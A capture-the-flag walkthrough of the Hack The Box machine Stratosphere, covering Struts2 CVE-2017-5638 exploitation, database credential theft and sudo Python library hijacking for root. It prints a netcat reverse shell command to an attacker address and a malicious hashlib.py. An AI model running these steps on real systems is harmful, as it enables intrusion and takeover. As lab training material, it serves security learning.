# Hack The Box: Stratosphere

**Difficulty:** Medium
**OS:** Linux

Stratosphere is a Medium-level Linux machine designed to highlight the risks of outdated Java web frameworks, specifically Apache Struts, and the importance of securing local Python environments. The initial compromise relies on a notorious Remote Code Execution (RCE) vulnerability in Apache Struts2. Privilege escalation involves pivoting through database credentials to a local user and exploiting a poorly implemented `sudo` Python script using library hijacking.

---

## Reconnaissance

The assessment begins with an Nmap scan to enumerate the available network services.

```bash
nmap -p- --min-rate 10000 10.10.10.64
nmap -p 22,80,8080 -sCV 10.10.10.64
```

The scan reveals three open ports:
*   **Port 22:** SSH (OpenSSH 7.4p1 Debian)
*   **Port 80:** HTTP (nginx/1.10.3)
*   **Port 8080:** HTTP (Apache Tomcat/8.5.23)

Navigating to the web service on port 80 or 8080 displays a generic landing page indicating "Stratosphere" and some marketing material for a cloud service. We perform directory brute-forcing using a tool like `gobuster` or `feroxbuster` against port 8080 to identify application paths.

```bash
gobuster dir -u http://10.10.10.64:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The directory enumeration reveals two important endpoints: `/manager` (requires authentication) and `/Monitoring`. 

## Web Application Analysis

We explore the `/Monitoring` directory. Navigating to `http://10.10.10.64:8080/Monitoring/example/Welcome.action` reveals a login page and a welcome message.

### Exploiting Apache Struts2 (CVE-2017-5638)

The `.action` extension immediately suggests the application is built using the Apache Struts2 framework. This framework is infamous for severe RCE vulnerabilities.

The most widely exploited Struts vulnerability is CVE-2017-5638, related to the Jakarta Multipart parser. The vulnerability exists because the `Content-Type` HTTP header is evaluated insecurely when processing file uploads, allowing an attacker to inject Object-Graph Navigation Language (OGNL) expressions.

If the application uses a vulnerable version of Struts2 (like 2.3.x before 2.3.32 or 2.5.x before 2.5.10), we can achieve unauthenticated RCE.

There are numerous exploit scripts and Metasploit modules available for this CVE. We can verify the vulnerability manually or by using a simple Python script.

We download a Python exploit script and point it at the `.action` endpoint.

```bash
python3 struts-pwn.py --url "http://10.10.10.64:8080/Monitoring/example/Welcome.action" -c "id"
```

The script crafts a malicious HTTP request with a highly customized `Content-Type` header containing the OGNL payload. The server parses the header, executes the command, and returns the result.

```text
uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
```

We execute a reverse shell payload to gain an interactive session.

```bash
python3 struts-pwn.py --url "http://10.10.10.64:8080/Monitoring/example/Welcome.action" -c "nc -e /bin/bash 10.10.14.X 9999"
```

We catch the reverse shell on our Netcat listener.

```bash
nc -lnvp 9999
# Connection received
id
# uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
```

## Lateral Movement

We gain initial access as the `tomcat8` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory. Checking the `/home` directory reveals a user named `richard`.

We search the web application directory (`/var/lib/tomcat8/webapps/Monitoring` or similar) for hardcoded database credentials or configuration files. We discover a database configuration file (`db_connect` or a Spring/Struts properties file).

```bash
cat /var/lib/tomcat8/webapps/Monitoring/WEB-INF/classes/db_connect
```

The file reveals plaintext database credentials: `admin:admin`. We connect to the local MySQL instance using these credentials.

```bash
mysql -u admin -padmin
```

We list the databases and tables. Inside a users or credentials table, we find the plaintext password for `richard`: `9tc*rhKuG5TyXvUP` (or a password hash that is easily cracked).

We use these credentials to authenticate via `su` or SSH as the system user `richard`.

```bash
su richard
Password: 9tc*rhKuG5TyXvUP
# Authentication successful
```
We retrieve the `user.txt` flag from Richard's home directory.

## Privilege Escalation

Enumerating the system as `richard`, we check for `sudo` privileges.

```bash
sudo -l
```

The output reveals that the user `richard` can run a specific Python script as `root` without a password.

```text
User richard may run the following commands on stratosphere:
    (root) NOPASSWD: /usr/bin/python /home/richard/test.py
```

### Abusing Python Library Path (Library Hijacking)

We analyze the `/home/richard/test.py` script. The script imports a custom module or standard library (e.g., `hashlib`).

```python
# Snippet from test.py
import hashlib
# ...
m = hashlib.md5()
```

When Python imports a module, it searches the directories listed in `sys.path`. If the script executes from a directory where `richard` has write access (like his home directory), Python will first look for the module in the current directory before checking the standard system libraries.

Because `test.py` imports `hashlib`, we can create a malicious file named `hashlib.py` in the same directory. When the script runs, it will import our malicious `hashlib.py` instead of the legitimate system module. This is known as "Library Hijacking."

We create `hashlib.py` containing a reverse shell payload or a command to spawn an interactive bash shell.

```python
import os
os.system("/bin/bash -p")
```

We save `hashlib.py` in `/home/richard/`. We then execute the permitted `sudo` command.

```bash
sudo /usr/bin/python /home/richard/test.py
```

The script runs as root, imports our malicious `hashlib.py`, and executes our system command.

```bash
# id
uid=0(root) gid=1000(richard) euid=0(root) groups=1000(richard)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
